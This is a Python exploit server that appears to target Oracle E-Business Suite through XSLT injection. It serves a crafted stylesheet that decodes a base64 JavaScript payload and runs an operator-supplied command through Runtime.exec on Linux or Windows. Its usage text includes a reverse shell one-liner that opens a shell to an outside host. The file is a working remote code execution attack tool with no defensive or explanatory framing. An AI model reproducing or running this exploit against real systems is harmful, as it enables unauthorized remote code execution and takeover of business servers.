import base64
import logging
import sys
from aiohttp import web

routes = web.RouteTableDef()

logging.basicConfig(level=logging.DEBUG)
access_logger = logging.getLogger("aiohttp.access")

@routes.get('/OA_HTML/help/../ieshostedsurvey.xsl')
async def config(request):
    global config_payload
    return web.Response(text=config_payload)

@routes.post('/OA_HTML/help/../ibeCRgpIndividualUser.jsp')
async def config(request):
    global config_payload
    return web.Response(text=config_payload)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('python3 server.py server_port target_system command')
        print('python3 server.py 80 linux \'bash -i >& /dev/tcp/8.8.8.8/4444 0>&1\'')
        print('python3 server.py 80 windows \'calc\'')
        exit(0)

    port = int(sys.argv[1])
    target_system = sys.argv[2]
    command = sys.argv[3]
    target_system = target_system.lower()

    shell_exe = ['sh', '-c']

    if target_system == 'windows':
        shell_exe[0] = 'cmd'
        shell_exe[1] = '/c'
    js_payload = f"""
    var stringc = java.lang.Class.forName('java.lang.String');
    var cmds =  java.lang.reflect.Array.newInstance(stringc,3);
    java.lang.reflect.Array.set(cmds,0,'{shell_exe[0]}');
    java.lang.reflect.Array.set(cmds,1,'{shell_exe[1]}');
    java.lang.reflect.Array.set(cmds,2,'{command}');
    java.lang.Runtime.getRuntime().exec(cmds);
    1
        """
    js_payload_base64 = base64.b64encode(js_payload.encode()).decode()
    config_payload = f'''<xsl:stylesheet version="1.0"
                    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                    xmlns:b64="http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder"
                    xmlns:jsm="http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngineManager"
                    xmlns:eng="http://www.oracle.com/XSL/Transform/java/javax.script.ScriptEngine"
                    xmlns:str="http://www.oracle.com/XSL/Transform/java/java.lang.String">
        <xsl:template match="/">
            <xsl:variable name="bs" select="b64:decodeBuffer(b64:new(),'{js_payload_base64}')"/>
            <xsl:variable name="js" select="str:new($bs)"/>
            <xsl:variable name="m" select="jsm:new()"/>
            <xsl:variable name="e" select="jsm:getEngineByName($m, 'js')"/>
            <xsl:variable name="code" select="eng:eval($e, $js)"/>
            <xsl:value-of select="$code"/>
        </xsl:template>
    </xsl:stylesheet>'''
    app = web.Application()
    app.add_routes(routes)
    web.run_app(app, port=port)
